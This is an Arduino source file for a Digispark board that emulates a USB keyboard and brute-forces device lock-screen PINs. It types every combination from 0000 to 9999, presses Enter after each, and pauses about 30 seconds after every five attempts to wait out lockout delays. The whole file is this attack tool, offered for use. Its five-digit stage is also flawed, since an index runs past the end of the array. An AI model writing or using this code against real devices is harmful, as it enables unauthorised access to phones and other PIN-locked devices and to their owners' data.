#include "DigiKeyboard.h"

int pin[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};
int a = 0;
int b = 0;
int c = 0;
int d = 0;
int e = 0;
int count = 0;
bool key_stroke_e = false;

void setup()
{
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0); // this is generally not necessary but with some older systems 
    delay(3000);                   // it seems to prevent missing the first character after a delay
}

void loop()
{
    // After 5 attempts, wait for 30 seconds
    if (count == 5)
    {
        digitalWrite(1, HIGH);
        DigiKeyboard.sendKeyStroke(40);
        delay(31000);
        count = 0;
        digitalWrite(1, LOW);
    }
    /*=========Key out the pin combinations==========*/
    if (key_stroke_e == false)
    {
        DigiKeyboard.sendKeyStroke(pin[a]);
        DigiKeyboard.sendKeyStroke(pin[b]);
        DigiKeyboard.sendKeyStroke(pin[c]);
        DigiKeyboard.sendKeyStroke(pin[d]);
    }

    if (key_stroke_e == true)
    {
        DigiKeyboard.sendKeyStroke(pin[a]);
        DigiKeyboard.sendKeyStroke(pin[b]);
        DigiKeyboard.sendKeyStroke(pin[c]);
        DigiKeyboard.sendKeyStroke(pin[d]);
        DigiKeyboard.sendKeyStroke(pin[e]);
    }
    DigiKeyboard.sendKeyStroke(40);
    delay(1000);
    d++;
    count++;
    /*========To count 0000 to 9999 number combinations=======*/
    if (d == 10)
    {
        d = 0;
        c++;

        if (c == 10)
        {
            c = 0;
            b++;

            if (b == 10)
            {
                b = 0;
                a++;

                if (a == 10)
                {

                    key_stroke_e = true;
                    e++;

                    if (e == 10)
                    {
                        e = 0;
                    }
                }
            }
        }
    }
}